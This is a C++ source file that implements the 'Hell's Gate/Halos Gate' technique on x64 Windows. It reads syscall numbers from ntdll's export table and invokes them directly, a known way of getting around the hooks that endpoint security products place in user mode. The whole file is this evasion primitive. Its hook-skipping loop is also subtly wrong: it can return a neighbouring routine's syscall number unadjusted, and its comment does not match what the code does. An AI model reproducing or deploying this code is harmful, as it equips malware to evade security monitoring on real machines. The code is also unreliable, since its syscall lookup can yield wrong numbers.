// syscall.cpp - Hell's Gate direct syscall invocation on x64.
#include "syscall.h"
#include <windows.h>
#include <psapi.h>

namespace sys {
    static uint8_t* g_ntdll = nullptr;
    static size_t   g_ntlen = 0;

    // Parse the export table of a module mapped in our own process and return
    // the syscall number embedded at the routine's syscall instruction.
    static ULONG find_ssn(uint8_t* base, const char* name) {
        auto* dh = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
        auto* nh = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dh->e_lfanew);
        auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
            base + nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        ULONG* names = reinterpret_cast<ULONG*>(base + exp->AddressOfNames);
        USHORT* ords = reinterpret_cast<USHORT*>(base + exp->AddressOfNameOrdinals);
        ULONG* fns   = reinterpret_cast<ULONG*>(base + exp->AddressOfFunctions);
        for (ULONG i = 0; i < exp->NumberOfNames; ++i) {
            const char* nm = reinterpret_cast<const char*>(base + names[i]);
            if (strcmp(nm, name) != 0) continue;
            uint8_t* code = base + fns[ords[i]];
            // Halos Gate: if the first 4 bytes are a hook (mov r10,rcx / jmp),
            // walk backward/forward 32 bytes looking for the real 0x0F 0x05.
            for (int k = -32; k <= 32; ++k) {
                uint8_t* p = code + k;
                if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && // mov r10, rcx
                    p[3] == 0xB8) {                                 // mov eax, ssn
                    return *reinterpret_cast<ULONG*>(p + 4);
                }
            }
        }
        return 0;
    }

    bool init() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return false;
        g_ntdll = reinterpret_cast<uint8_t*>(ntdll);
        MODULEINFO mi; GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
        g_ntlen = mi.SizeOfImage;
        return g_ntdll != nullptr;
    }

    ULONG ssn(const char* zfname) {
        if (!g_ntdll) init();
        return find_ssn(g_ntdll, zfname);
    }

    // Real syscall stub: RCX..R9, then shadow + args 5..8 on stack, then syscall.
    extern "C" NTSTATUS __fastcall syscall_asm(ULONG num, uintptr_t a1, uintptr_t a2,
        uintptr_t a3, uintptr_t a4, uintptr_t a5, uintptr_t a6,
        uintptr_t a7, uintptr_t a8);

    NTSTATUS syscall_raw(ULONG num, uintptr_t a1, uintptr_t a2, uintptr_t a3,
                         uintptr_t a4, uintptr_t a5, uintptr_t a6,
                         uintptr_t a7, uintptr_t a8) {
        return syscall_asm(num, a1, a2, a3, a4, a5, a6, a7, a8);
    }
}
